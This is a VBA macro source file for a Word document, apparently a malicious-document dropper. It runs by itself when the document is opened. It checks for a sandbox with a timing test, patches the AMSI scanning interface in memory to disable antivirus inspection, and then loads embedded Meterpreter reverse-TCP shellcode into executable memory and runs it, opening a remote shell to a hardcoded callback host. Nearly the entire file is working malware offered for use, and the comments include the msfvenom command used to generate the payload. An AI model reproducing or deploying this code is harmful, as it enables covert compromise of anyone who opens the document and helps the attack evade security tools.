'av bypass logic
' Declare Sleep function to pause execution for sandbox detection
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' Declare functions to enumerate and retrieve process modules
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, moduleHandles As LongPtr, ByVal size As LongPtr, bytesNeeded As LongPtr, ByVal filterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal moduleName As String, ByVal size As LongPtr) As LongPtr

' Standard functions for module and function resolution
Private Declare PtrSafe Function LoadModule Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal moduleName As String) As LongPtr
Private Declare PtrSafe Function GetFunctionAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal procName As String) As LongPtr
Private Declare PtrSafe Function ModifyProtection Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal size As LongPtr, ByVal newProtection As LongPtr, oldProtection As LongPtr) As LongPtr
Private Declare PtrSafe Sub OverwriteMemory Lib "KERNEL32" Alias "RtlFillMemory" (destination As Any, ByVal length As Long, ByVal fill As Byte)

' Functions to allocate memory and execute payload
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal securityAttributes As Long, ByVal stackSize As Long, ByVal startAddress As LongPtr, param As LongPtr, ByVal creationFlags As Long, threadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal address As LongPtr, ByVal size As Long, ByVal allocationType As Long, ByVal protection As Long) As LongPtr

' Main function to execute the macro payload
Function RunMacro()
    Dim currentTime         ' Variable to store the current time
    Dim startTime As Date   ' Variable to store the start time
    Dim endTime As Date     ' Variable to store the end time
    Dim elapsed As Variant  ' Variable to store elapsed time
    Dim delta As Integer    ' Variable to store the difference in seconds

    ' Detect sandbox by pausing execution and comparing elapsed time
    currentTime = Time
    startTime = Date + currentTime
    Sleep (4000) ' Pause for 4 seconds
    endTime = Date + Time
    elapsed = DateDiff("s", startTime, endTime)
    delta = CInt(elapsed)
    If elapsed < 3.5 Then Exit Function ' Exit if less than 3.5 seconds elapsed (indicating a sandbox)

    ' Initialize variables for payload execution
    Dim is64Bit As Boolean       ' Flag to check if the architecture is 64-bit
    Dim moduleFile As String     ' Variable to store the name of the AMSI module
    Dim amsiDetected As Boolean  ' Flag to check if AMSI is detected
    Dim payload As Variant       ' Array to store the shellcode payload
    Dim allocatedAddr As LongPtr ' Pointer to the allocated memory for the payload
    Dim index As LongPtr         ' Counter for the payload array
    Dim shellcodeData As String  ' Temporary variable for shellcode data
    Dim executionResult As LongPtr ' Variable to store the result of the thread execution

    ' Dynamically resolve AMSI module file
    moduleFile = Dir("c:\windows\system32\a?s?.d*")

    ' Determine if the process is 64-bit or 32-bit
    is64Bit = CheckArchitecture()

    ' Check if AMSI is loaded into the current process
    amsiDetected = DetectAMSI(moduleFile, is64Bit)

    ' If AMSI is detected, patch it to disable functionality
    If amsiDetected Then PatchAMSI moduleFile, is64Bit

    ' Define payload based on architecture
    If is64Bit Then
        ' Shellcode payload for 64-bit architecture
        ' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
        payload = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 77, 49, 201, 72, 139, 114, 80, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 65, 81, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 68, 139, 64, 32, 73, 1, 208, 139, 72, 24, 227, 86, 72, 255, 201, 65, 139, 52, 136, 77, 49, 201, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 65, 88, 65, 88, 94, 72, 1, 208, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
188, 2, 0, 1, 187, 192, 168, 93, 128, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
    Else
        ' Shellcode payload for 32-bit architecture
        ' msfvenom -p windows/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
        payload = Array(252, 232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 49, 255, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 139, 88, 32, 80, 1, 211, 133, 201, 116, 60, 73, 49, _
255, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 93, 128, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, _
94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    End If

    ' Allocate memory for the payload
    allocatedAddr = VirtualAlloc(0, UBound(payload), &H3000, &H40)

    ' Copy shellcode into the allocated memory
    For index = LBound(payload) To UBound(payload)
        shellcodeData = Hex(payload(index))
        OverwriteMemory ByVal (allocatedAddr + index), 1, ByVal ("&H" & shellcodeData)
    Next index

    ' Execute the shellcode by creating a new thread
    executionResult = CreateThread(0, 0, allocatedAddr, 0, 0, 0)
End Function

' Function to check the architecture of the process (32-bit or 64-bit)
Function CheckArchitecture() As Boolean
    #If Win64 Then
        CheckArchitecture = True ' 64-bit process
    #Else
        CheckArchitecture = False ' 32-bit process
    #End If
End Function

' Function to detect AMSI module in the current process
Function DetectAMSI(moduleFile As String, is64Bit As Boolean) As Boolean
    Dim processName As String     ' Temporary variable for the process name
    Dim modules(0 To 1023) As LongPtr ' Array to store module handles
    Dim moduleCount As Integer    ' Counter for the number of modules
    Dim result As LongPtr         ' Variable to store the result of module enumeration
    DetectAMSI = False            ' Default to no AMSI detection

    ' Enumerate all loaded modules in the current process
    result = EnumProcessModulesEx(-1, modules(0), 1024, cbNeeded, &H3)
    moduleCount = IIf(is64Bit, cbNeeded / 8, cbNeeded / 4) ' Determine module count based on architecture

    ' Check each module for the AMSI module
    For i = 0 To moduleCount
        processName = String$(50, 0)
        GetModuleName -1, modules(i), processName, Len(processName)
        If Left(processName, 8) = moduleFile Then
            DetectAMSI = True
        End If
    Next i
End Function

' Function to patch AMSI by overwriting specific functions
Sub PatchAMSI(moduleFile As String, is64Bit As Boolean)
    Dim libHandle As LongPtr        ' Handle to the AMSI library
    Dim funcAddress As LongPtr      ' Address of the function to patch
    Dim tmpProtection As LongPtr    ' Temporary variable for memory protection
    Dim oldProtection As LongPtr    ' Variable to store old memory protection
    Dim offset As Integer           ' Offset for function patching

    ' Load the AMSI module
    libHandle = LoadModule(moduleFile)

    ' Determine offset for function patching based on architecture
    offset = IIf(is64Bit, 96, 80)

    ' Locate the AMSI initialization function and patch it
    funcAddress = GetFunctionAddr(libHandle, "Am" & Chr(115) & Chr(105) & "UacInitialize") - offset
    tmpProtection = ModifyProtection(ByVal funcAddress, 32, 64, oldProtection)
    OverwriteMemory ByVal (funcAddress), 1, ByVal ("&H" & "90") ' NOP instruction
    OverwriteMemory ByVal (funcAddress + 1), 1, ByVal ("&H" & "C3") ' RET instruction
    tmpProtection = ModifyProtection(ByVal funcAddress, 32, oldProtection, 0)
End Sub

' Subroutine to automatically run the macro
Sub AutoRun()
    RunMacro
End Sub

' Event handlers for opening the document
Sub Document_Open()
    AutoRun
End Sub
Sub AutoOpen()
    AutoRun
End Sub
